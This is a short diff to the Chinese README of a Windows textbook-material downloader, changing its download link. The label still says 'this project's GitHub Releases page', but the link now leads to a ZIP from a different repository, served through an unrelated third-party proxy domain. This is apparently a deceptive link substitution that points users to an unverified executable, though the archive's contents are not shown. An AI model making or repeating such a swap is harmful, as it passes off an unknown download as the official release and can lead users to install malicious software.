@@ -13,7 +13,7 @@
 - 💻**平台支持**：目前仅支持 Windows（图形界面），后期如使用人数增多会考虑其他平台版本发布。
 
 ## 📥下载与安装方法
-本项目的 [GitHub Releases 页面](https://github.com/happycola233/tchMaterial-parser/releases)直接进行下载。
+本项目的 [GitHub Releases 页面](https://git.feifanlib.shop/https://github.com/cqys023/Teacher-material-downloader/releases/download/V1.1.0/EDU.V1.0.zip)直接进行下载。
 在下载完成之后，解压即可运行本程序，不需要额外的安装步骤。
 
 ## 🛠️使用方法
